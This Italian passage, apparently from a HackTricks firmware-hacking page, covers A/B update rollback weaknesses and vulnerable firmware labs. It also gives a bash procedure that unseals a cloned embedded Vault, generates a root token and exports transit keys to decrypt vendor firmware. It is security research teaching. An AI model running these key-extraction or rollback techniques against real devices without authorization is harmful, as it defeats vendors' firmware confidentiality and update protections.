Aspetti da verificare durante il reverse engineering delle implementazioni di aggiornamento A/B:

- La selezione dello slot deriva da **flag di avvio** che non vengono aggiornati dopo uno switch riuscito.
- Una routine simile a `prepare_passive_slot()` cancella uno slot in base a uno stato obsoleto invece che al **layout attualmente salvato**.
- Una funzione simile a `part_write_layout()` incrementa solo un **contatore di generazione** / flag di attivazione e non memorizza l’hash dell’immagine convalidata.
- I controlli del ratchet sono implementati in userspace o nel codice dell’updater, ma **non** nelle fasi ROM / bootloader / secure boot.
- Le routine di cancellazione o recovery lasciano lo slot contrassegnato come avviabile anche dopo che il suo contenuto è stato rimosso e riscritto.

### Checklist per valutare la logica di aggiornamento

* Il trasporto/autenticazione dell’*endpoint di aggiornamento* è adeguatamente protetto (TLS + autenticazione)?
* Il dispositivo confronta i **numeri di versione** o un **contatore monotono anti-rollback** prima del flashing?
* L’immagine viene verificata all’interno di una catena di secure boot (per esempio, le firme sono verificate dal codice ROM)?
* Il **bootloader applica lo stesso ratchet** dell’updater, invece di controllare solo firma/CRC?
* I metadati di attivazione dello slot sono **legati all’hash/versione del firmware convalidato**, o è possibile modificare uno slot dopo la promozione?
* Dopo uno switch dello slot riuscito, il dispositivo è costretto a riavviarsi o nella stessa sessione sono ancora accessibili altre routine di aggiornamento/cancellazione?
* Il codice in userland esegue ulteriori controlli di coerenza (per esempio, sulla mappa delle partizioni consentita o sul numero di modello)?
* I flussi di aggiornamento *parziali* o di *backup* riutilizzano la stessa logica di convalida?

> 💡  Se manca uno qualsiasi degli elementi sopra, è probabile che la piattaforma sia vulnerabile agli attacchi di rollback.

## Firmware vulnerabile per esercitarsi

Per esercitarti a individuare vulnerabilità nel firmware, usa come punto di partenza i seguenti progetti di firmware vulnerabile.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperare le chiavi di decrittazione del firmware dallo stato di KMS/Vault incorporato

Quando un’immagine di aggiornamento combina piccoli metadati in chiaro con un grande blob ad alta entropia, esegui prima il triage del contenitore, prima di tentare qualsiasi brute-force:<sup>[[1]](#references)</sup>

- Estrai header, offset e confini delle righe con `hexdump`, `xxd`, `strings -tx`, `base64 -d` e `binwalk -E`.
- `Salted__` di solito indica il formato OpenSSL `enc`: i successivi 8 byte sono il salt e i byte rimanenti sono il ciphertext.
- Un campo Base64 che, una volta decodificato, è lungo esattamente `256` byte è un forte indizio che si tratti di un ciphertext RSA-2048 che contiene una password/session key casuale del firmware.
- Il materiale PGP detached nello stesso file spesso protegge solo l’autenticità; non dare per scontato che sia il meccanismo di riservatezza.

Se la ricerca di chiavi statiche (`grep`, `strings`, ricerche PEM/PGP) non dà risultati, fai il reverse engineering del **percorso operativo di decrittazione** invece di limitarti a cercare chiavi private:

- Decompila l’updater / il binario di gestione e segui chi legge il blob crittografato, quale helper/API lo decifra e quale nome logico della chiave richiede.
- Cerca nello user filesystem estratto lo stato di KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), oltre ai file unit e agli script di init.
- Considera le istruzioni in chiaro `vault operator unseal ...`, le chiavi di recovery, i token di bootstrap o gli script locali di auto-unseal KMS come equivalenti a materiale di chiave privata.

Se l’appliance include il binario Vault originale e il backend di storage, riprodurre quell’ambiente è di solito più semplice che reimplementare gli interni di Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Con accesso root sul KMS clonato:

- Rendi esportabili le chiavi transit solo all'interno del clone isolato: `vault write transit/keys/<name>/config exportable=true`
- Esporta la chiave unwrap: `vault read transit/export/encryption-key/<name>`
- Prova la chiave RSA recuperata usando la coppia esatta di padding/hash utilizzata dal KMS. Un tentativo di decrittazione PKCS#1 v1.5 fallito e un tentativo di decrittazione OAEP predefinito fallito **non** dimostrano che la chiave sia sbagliata; molti flussi basati su Vault usano OAEP con SHA-256, mentre le librerie più comuni usano SHA-1 come valore predefinito.
- Se il payload inizia con `Salted__`, riproduci esattamente il KDF OpenSSL del vendor (`EVP_BytesToKey`, spesso MD5 negli appliance legacy) prima di tentare la decrittazione AES-CBC.

Questo trasforma il problema del "firmware cifrato" in un problema più generale: **recuperare le chiavi operative lato appliance e poi riprodurre offline i parametri esatti di unwrap + KDF**.

## Formazione e certificazioni

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking del firmware con Claude: competenze da senior, autonomia da junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologia di test della sicurezza del firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking pratico dell'IoT: la guida definitiva agli attacchi all'Internet delle cose](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Sfruttare zero-day in hardware abbandonato – blog di Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Come un dispositivo smart da 20 $ mi ha dato accesso a casa tua](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ora mi vedi: ora sei stato pwnato](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Sfruttare il Tesla Wall Connector dalla porta di ricarica - Parte 2: aggirare la protezione anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Fallo lampeggiare: sfruttamento over-the-air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS su QEMU, parte 2: debugging e correzioni](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
{{#include ../../banners/hacktricks-training.md}}
